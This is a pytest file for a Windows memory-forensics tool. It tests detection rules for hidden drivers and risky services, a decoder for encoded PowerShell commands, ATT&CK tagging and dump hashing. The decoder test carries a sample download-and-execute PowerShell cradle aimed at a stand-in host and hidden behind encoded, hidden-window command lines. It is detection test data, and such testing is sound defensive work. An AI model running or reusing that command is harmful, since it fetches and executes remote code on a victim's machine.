"""Plugin registry, hidden-driver / risky-service rules, EncodedCommand decoder, ATT&CK tags and dump hashing."""
import base64
import csv
import json
import sys

from test_pipeline_and_runner import FAKE_VOL, FIXTURE, env, load_fixture_result, make_dump, settings


def plugin(name, rows, status="Completed"):
    from app.models import PluginResult
    return PluginResult(name, status, rows)


def with_plugins(*plugins):
    result = load_fixture_result()
    result.plugins = list(result.plugins) + list(plugins)
    return result


def findings(result, rule_id):
    from app.engines.windows.indicators.engine import IndicatorEngine
    return [f for f in IndicatorEngine().evaluate(result) if f.rule_id == rule_id]


# ----------------------------------------------------------------------------- plugin registry
def test_registry_keeps_the_original_core_plugin_order_and_is_consistent():
    from app.engines.windows.analysis import plugin_registry as reg
    from app.engines.windows.analysis.real_provider import RealProvider
    assert RealProvider.CORE_PLUGINS == [
        "windows.info", "windows.pslist", "windows.psscan", "windows.pstree", "windows.cmdline", "windows.getsids",
        "windows.netscan", "windows.netstat", "windows.malfind", "windows.dlllist", "windows.handles"]
    assert RealProvider.EXTENDED_PLUGINS == ["windows.modules", "windows.modscan", "windows.ssdt", "windows.callbacks"]
    assert RealProvider.REQUIRED_PLUGINS == ("windows.info", "windows.pslist")
    all_names = [s.name for s in reg.REGISTRY]
    assert len(all_names) == len(set(all_names)) and all(n.startswith("windows.") for n in all_names)


def test_provider_runs_optional_plugins_only_when_chosen():
    from app.engines.windows.analysis.real_provider import RealProvider
    assert "windows.svcscan" not in RealProvider({}).plugin_names
    assert "windows.svcscan" in RealProvider({"optional_plugins": ["windows.svcscan"]}).plugin_names
    assert "windows.nonsense" not in RealProvider({"optional_plugins": ["windows.nonsense"]}).plugin_names   # unknown names are ignored
    from app.settings import sanitize
    assert sanitize({"optional_plugins": "oops"})["optional_plugins"] == []


def test_optional_and_extended_plugins_run_through_the_provider_and_feed_the_rules(tmp_path):
    from app.engines.windows.analysis.real_provider import RealProvider
    data = json.loads(FIXTURE.read_text(encoding="utf-8"))
    data["windows.modules"] = [{"Base": 0x1000, "Name": "ntoskrnl.exe", "Path": "\\SystemRoot\\system32\\ntoskrnl.exe"}]
    data["windows.modscan"] = data["windows.modules"] + [{"Base": 0x9000, "Name": "evil.sys", "Path": "C:\\Users\\Public\\evil.sys"}]
    data["windows.svcscan"] = [{"Name": "Updater", "Display": "Updater", "Type": "SERVICE_WIN32_OWN_PROCESS", "State": "SERVICE_RUNNING",
                                "Start": "SERVICE_AUTO_START", "PID": 4, "Binary": "C:\\Users\\Public\\upd.exe -run", "Binary (Registry)": "", "Dll": ""}]
    fixture = tmp_path / "fixture.json"
    fixture.write_text(json.dumps(data), encoding="utf-8")
    events = []
    with env(MEMORYGRAPH_HOME=str(tmp_path / "home"), FAKE_VOL_FIXTURE=str(fixture)):
        result = RealProvider(settings(tmp_path, run_extended_plugins=True, optional_plugins=["windows.svcscan"])).run(
            make_dump(tmp_path), None, lambda n, s, d: events.append((n, s)))
    assert {"windows.modules", "windows.modscan", "windows.svcscan"} <= {n for n, s in events if s == "done"}
    ids = {f.rule_id for f in result.indications}
    assert {"DRV-001", "SVC-001"} <= ids
    service = next(f for f in result.indications if f.rule_id == "SVC-001")
    assert service.process_pid == 4 and service.source_plugins == ["windows.svcscan"]


# ----------------------------------------------------------------------------- DRV-001
MODULES = [{"Base": 0x1000, "Name": "ntoskrnl.exe", "Path": "\\SystemRoot\\system32\\ntoskrnl.exe"},
           {"Base": 0x5000, "Name": "tcpip.sys", "Path": "\\SystemRoot\\System32\\drivers\\tcpip.sys"}]


def test_hidden_driver_rule_needs_both_plugins_and_stays_quiet_without_them():
    assert findings(with_plugins(plugin("windows.modscan", MODULES)), "DRV-001") == []              # modules missing
    assert findings(with_plugins(plugin("windows.modules", MODULES), plugin("windows.modscan", [], "Failed")), "DRV-001") == []
    assert findings(with_plugins(plugin("windows.modules", MODULES), plugin("windows.modscan", MODULES)), "DRV-001") == []   # identical


def test_hidden_driver_rule_separates_stale_objects_from_risky_ones_and_keeps_provenance():
    scan = MODULES + [
        {"Base": 0x7000, "Name": "old.sys", "Path": "\\SystemRoot\\System32\\drivers\\old.sys"},   # unloaded driver: Low aggregate
        {"Base": 0x8000, "Name": "tcpip.sys", "Path": ""},                                          # same name reloaded elsewhere: ignored
        {"Base": 0x9000, "Name": "evil.sys", "Path": "C:\\Users\\Public\\evil.sys"},                # risky folder: own Medium finding
    ]
    found = findings(with_plugins(plugin("windows.modules", MODULES), plugin("windows.modscan", scan)), "DRV-001")
    medium = [f for f in found if f.severity == "Medium"]
    low = [f for f in found if f.severity == "Low"]
    assert len(medium) == 1 and "evil.sys" in medium[0].title
    assert medium[0].evidence_items[0].source_plugin == "windows.modscan" and medium[0].evidence_items[0].row_index == 4
    assert len(low) == 1 and "1 driver object" in low[0].title and "evil.sys" not in " ".join(low[0].evidence)
    assert set(medium[0].source_plugins) == {"windows.modscan", "windows.modules"}


# ----------------------------------------------------------------------------- SVC-001
def svc(name, binary, kind="SERVICE_WIN32_OWN_PROCESS", dll="", registry=""):
    return {"Name": name, "Display": name, "Type": kind, "State": "SERVICE_RUNNING", "Start": "SERVICE_AUTO_START", "PID": 0,
            "Binary": binary, "Binary (Registry)": registry, "Dll": dll}


def test_risky_service_rule():
    rows = [svc("Good", "C:\\Windows\\system32\\svchost.exe -k netsvcs", dll="C:\\Windows\\System32\\good.dll"),
            svc("Temp", "\"C:\\Users\\bob\\AppData\\Local\\Temp\\x.exe\" /s"),
            svc("Hosted", "C:\\Windows\\system32\\svchost.exe -k x", dll="C:\\Users\\Public\\evil.dll"),
            svc("PerUser", "C:\\Users\\bob\\AppData\\Roaming\\tool\\tool.exe"),
            svc("Vendor", "C:\\Users\\bob\\AppData\\Local\\Microsoft\\OneDrive\\od.exe"),
            svc("Driver", "\\Driver\\Temp", kind="SERVICE_KERNEL_DRIVER")]
    found = findings(with_plugins(plugin("windows.svcscan", rows)), "SVC-001")
    by_name = {f.evidence_items[0].description: f for f in found}
    assert set(by_name) == {"Temp", "Hosted", "PerUser"}
    assert by_name["Temp"].severity == "Medium" and by_name["Hosted"].severity == "Medium" and by_name["PerUser"].severity == "Low"
    assert by_name["Hosted"].evidence_items[0].field == "Dll" and by_name["Temp"].evidence_items[0].row_index == 1


# ----------------------------------------------------------------------------- decoder
def encoded(script):
    return base64.b64encode(script.encode("utf-16-le")).decode()


def test_encoded_command_is_decoded_and_bad_input_is_not_guessed():
    from app.analysis.decoders import decode_encoded_command
    script = "IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')"
    for cmd in (f"powershell.exe -NoP -W Hidden -EncodedCommand {encoded(script)}", f"powershell -enc {encoded(script)} -NoLogo",
                f'powershell -e "{encoded(script)}"'):
        assert decode_encoded_command(cmd).text == script
    for cmd in ("powershell -ExecutionPolicy Bypass -File a.ps1", "powershell -e aGVsbG8gd29ybGQ=", "powershell -e !!!!!!!!!", "", None):
        assert decode_encoded_command(cmd) is None


def test_decoded_command_html_names_its_source():
    from app.windows.widgets import decoded_command_html
    html = decoded_command_html(f"powershell -enc {encoded('Write-Host <hi>')}", 4216)
    assert "PID 4216" in html and "windows.cmdline" in html and "Write-Host &lt;hi&gt;" in html
    assert decoded_command_html("cmd.exe /c dir", 1) == ""


# ----------------------------------------------------------------------------- ATT&CK
def test_every_technique_used_by_a_rule_has_local_details_and_the_app_has_no_web_links():
    import pathlib
    from app.engines.windows.indicators.attack import ATTACK_BY_RULE
    used = {t for techniques in ATTACK_BY_RULE.values() for t in techniques}
    assert used and all(t.info.summary and t.info.tactics and t.info.look_for for t in used), [t.id for t in used if not t.info.summary]
    from app.engines.windows.indicators.attack import Technique
    assert Technique("T9999", "unknown").info.summary == ""                      # an id missing from the file is tolerated
    app_dir = pathlib.Path(__file__).resolve().parent.parent / "app"
    banned = ("import urllib", "from urllib", "import requests", "import webbrowser", "import socket", "QtNetwork", "QNetworkAccessManager",
              "http.client", "http://", "https://")
    offenders = []
    for path in app_dir.rglob("*.py"):
        if path.parts[-3:-1] == ("indicators", "rules"):          # detection patterns for URLs in command lines are data, not connections
            continue
        if path.name == "demo.py":                                # the Linux demo is made-up data: its web addresses are text in a command line, not connections
            continue
        for number, line in enumerate(path.read_text(encoding="utf-8").splitlines(), 1):
            if any(word in line for word in banned):
                offenders.append(f"{path.relative_to(app_dir)}:{number}: {line.strip()[:80]}")
    assert offenders == [], offenders


def test_every_rule_has_an_attack_entry_and_tags_are_well_formed():
    import re
    from app.engines.windows.indicators.attack import ATTACK_BY_RULE, attack_for
    from app.engines.windows.indicators.engine import DEFAULT_RULES
    for rule in DEFAULT_RULES:
        assert rule.rule_id in ATTACK_BY_RULE, rule.rule_id
    assert {"CORR-001", "CORR-002"} <= set(ATTACK_BY_RULE)
    for techniques in ATTACK_BY_RULE.values():
        for t in techniques:
            assert re.fullmatch(r"T\d{4}(\.\d{3})?", t.id) and t.name
    assert [t.id for t in attack_for("CL-001")] == ["T1059.001", "T1027"]
    info = attack_for("HND-001")[0].info                                   # read from the local file, never from the web
    assert info.tactics == ("Credential Access",) and "LSASS" in info.summary and info.look_for
    assert not hasattr(attack_for("HND-001")[0], "url")
    assert attack_for("no-such-rule") == []


# ----------------------------------------------------------------------------- hashing of dumped files
def test_hashing_helpers_and_manifest(tmp_path):
    import hashlib
    from app.engines.windows.analysis.dumper import MANIFEST_NAME, hash_new_files, snapshot_dir, write_manifest
    (tmp_path / "old.bin").write_bytes(b"old")
    before = snapshot_dir(str(tmp_path))
    (tmp_path / "pid.4.dmp").write_bytes(b"MZ" + b"\x00" * 5000)
    files = hash_new_files(str(tmp_path), before)
    assert [f.name for f in files] == ["pid.4.dmp"]
    assert files[0].sha256 == hashlib.sha256(b"MZ" + b"\x00" * 5000).hexdigest() and files[0].size == 5002
    path = write_manifest(str(tmp_path), files, "windows.pslist", 4, "image.raw", ["vol", "-f", "image.raw"])
    write_manifest(str(tmp_path), files, "windows.pslist", 4, "image.raw", ["vol"])           # second dump appends, one header
    rows = list(csv.reader(open(path, encoding="utf-8", newline="")))
    assert rows[0][:5] == ["utc_time", "file", "size_bytes", "sha256", "md5"] and len(rows) == 3
    assert rows[1][1] == "pid.4.dmp" and rows[1][3] == files[0].sha256 and rows[1][5:8] == ["windows.pslist", "4", "image.raw"]
    assert path.endswith(MANIFEST_NAME) and MANIFEST_NAME not in snapshot_dir(str(tmp_path))     # the manifest never hashes itself


def test_dumper_returns_hashes_and_survives_a_dump_that_wrote_nothing(tmp_path):
    from app.engines.windows.analysis.dumper import VolatilityDumper
    stub = tmp_path / "stub_vol.py"
    stub.write_text("import sys, os\nargs = sys.argv\nout = args[args.index('-o') + 1]\n"
                    "if '--dump' in args:\n    open(os.path.join(out, 'pid.4.dmp'), 'wb').write(b'abc')\n", encoding="utf-8")
    dumper = VolatilityDumper(make_dump(tmp_path), str(stub))
    out = tmp_path / "out"
    completed, _command = dumper.dump_process(4, str(out))
    assert [a.name for a in completed.artifacts] == ["pid.4.dmp"] and completed.manifest.endswith("memorygraph_hashes.csv")
    completed, _command = dumper.dump_handles(4, str(out))               # stub writes nothing without --dump
    assert completed.artifacts == [] and completed.manifest == ""
